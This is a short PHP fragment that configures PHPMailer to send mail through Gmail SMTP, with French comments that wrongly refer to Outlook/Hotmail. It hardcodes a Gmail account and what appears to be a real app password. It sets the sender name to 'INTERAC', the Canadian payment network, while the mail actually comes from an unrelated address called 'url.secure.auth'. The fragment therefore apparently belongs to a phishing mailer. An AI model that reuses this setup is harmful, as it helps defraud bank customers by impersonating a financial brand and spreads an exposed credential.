...
try {
    ...
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com'; // Adresse du serveur SMTP Outlook/Hotmail
    $mail->SMTPAuth = true;
    $mail->Username = 'url.secure.auth@gmail.com'; // Remplacez par votre adresse email Hotmail
    $mail->Password = 'urfx jmos phwd bzxt'; // Remplacez par votre mot de passe Hotmail
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; // Utilisez STARTTLS pour Outlook
    $mail->Port = 587; // Le port SMTP pour Outlook

    // Configuration de l'expéditeur et du destinataire
    $mail->setFrom('url.secure.auth@gmail.com', "INTERAC"); // Remplacez par votre adresse email Hotmail
